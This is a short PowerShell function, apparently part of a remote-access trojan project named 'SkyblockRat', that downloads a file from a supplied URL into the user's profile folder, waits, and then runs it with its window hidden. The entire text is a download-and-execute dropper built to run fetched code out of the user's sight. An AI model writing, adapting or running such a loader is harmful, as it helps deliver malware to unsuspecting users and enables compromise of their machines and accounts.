function run {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$True)]
    [string]$urltofile,
    [parameter(Position=1,Mandatory=$True)]
    [string]$filenamea,
    [parameter(Position=2,Mandatory=$True)]
    [string]$waittime
)

    $outpath = "C:\Users\$env:username\SkyblockRat-main\$filenamea"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $urltofile -OutFile $outpath

    $args = "/filename C:\Users\$env:username\SkyblockRat-main\$filenamea"
    
    Start-Sleep -seconds $waittime
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
}
